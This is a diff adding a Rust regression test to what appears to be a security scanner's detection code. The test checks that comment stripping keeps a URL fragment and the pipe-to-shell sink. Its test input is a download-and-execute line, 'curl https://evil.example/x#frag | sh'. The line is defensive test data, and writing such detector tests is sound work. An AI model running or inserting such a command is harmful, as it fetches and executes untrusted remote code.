@@ -1133,6 +1133,21 @@ mod tests {
         assert_eq!(stripped, js, "`.js` content must round-trip unchanged");
     }
 
+    /// Contract: a `#` URL fragment in a shell command is NOT treated as a
+    /// comment, so a download-execute line with a fragment survives
+    /// stripping and reaches the detectors. Pre-fix the fragment split the
+    /// line and dropped the `| sh` sink, evading detection.
+    #[test]
+    fn strip_comments_for_detection_keeps_shell_url_fragment() {
+        let content = "curl https://evil.example/x#frag | sh\n";
+        let stripped = strip_comments_for_detection(content, "sh");
+        assert!(
+            stripped.contains("| sh"),
+            "the pipe-to-shell sink must survive stripping; got {stripped:?}",
+        );
+        assert!(stripped.contains("#frag"), "URL fragment must be preserved");
+    }
+
     /// Contract: `references_dotenv_file` MUST NOT classify benign
     /// content that incidentally contains the four bytes `.env` as a
     /// dotenv-file reference. Pre-fix `lower.contains(".env")` fired on
